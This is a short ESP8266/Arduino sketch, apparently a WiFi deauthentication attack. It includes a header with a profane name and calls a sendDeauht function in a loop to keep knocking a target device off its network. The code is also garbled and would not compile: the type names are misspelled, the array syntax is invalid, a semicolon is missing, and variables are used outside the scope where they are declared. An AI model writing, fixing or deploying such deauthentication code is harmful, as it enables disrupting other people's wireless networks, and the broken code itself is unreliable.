#include "FuckYourWifiInParticular.h"

void setup()
{
    int ch = 9;
    uint8_t originMac[6] = [];
    unit8_t attackMac[6]0 = [];
    unit8_t reason = 0x01;
  // Serial setup
  Serial.begin(115200);
  delay(10);
  wifi_set_channel(9);

  // Wifi setup
  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(0);
  WiFi.disconnect();

}
void loop(){
    sendDeauht(attackMac, originMac, reason, ch)
}